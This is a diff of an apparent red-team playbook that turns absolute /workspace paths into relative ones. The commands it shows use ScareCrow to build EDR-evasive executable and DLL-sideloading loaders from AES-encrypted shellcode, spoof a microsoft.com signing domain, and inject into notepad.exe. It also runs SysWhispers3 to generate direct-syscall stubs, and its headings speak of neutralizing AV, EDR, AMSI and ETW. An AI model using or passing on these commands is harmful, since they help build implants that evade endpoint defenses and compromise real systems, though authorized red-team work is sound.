@@ -134,26 +134,26 @@ ScareCrow generates payloads that bypass EDR by unhooking userland API hooks, us
 ### Basic Payload Generation
 ```bash
 # Generate EDR-evasive loader with AES-encrypted shellcode
-ScareCrow -I /workspace/implants/shellcode.bin \
+ScareCrow -I implants/shellcode.bin \
     -Loader binary \
     -domain microsoft.com \
     -encryptionmode AES \
-    -o /workspace/implants/evasive_payload.exe
+    -o implants/evasive_payload.exe
 
 # DLL output (for sideloading)
-ScareCrow -I /workspace/implants/shellcode.bin \
+ScareCrow -I implants/shellcode.bin \
     -Loader dll \
     -domain microsoft.com \
     -encryptionmode AES \
-    -o /workspace/implants/evasive_payload.dll
+    -o implants/evasive_payload.dll
 
 # Control process for injection
-ScareCrow -I /workspace/implants/shellcode.bin \
+ScareCrow -I implants/shellcode.bin \
     -Loader binary \
     -domain microsoft.com \
     -injection "C:\\Windows\\System32\\notepad.exe" \
     -encryptionmode AES \
-    -o /workspace/implants/injected_payload.exe
+    -o implants/injected_payload.exe
 ```
 
 ### ScareCrow Features
@@ -296,7 +296,7 @@ Advantage: Call stack looks legitimate to EDR stack inspection
 ### Tools
 ```bash
 # SysWhispers3 — generate syscall stubs
-python3 syswhispers.py --preset common -o /workspace/syscalls/
+python3 syswhispers.py --preset common -o syscalls/
 
 # Output: syscalls.h, syscalls.c, syscalls-asm.x64.asm
 # Integrate into C/C++ loader project
@@ -466,7 +466,7 @@ Defenses Bypassed (AV/EDR/AMSI/ETW neutralized)
 ## 11. Output Files
 
 ```
-/workspace/
+./
 ├── implants/
 │   ├── evasive_payload.exe        # ScareCrow-generated payload
 │   ├── evasive_payload.dll        # DLL variant for sideloading
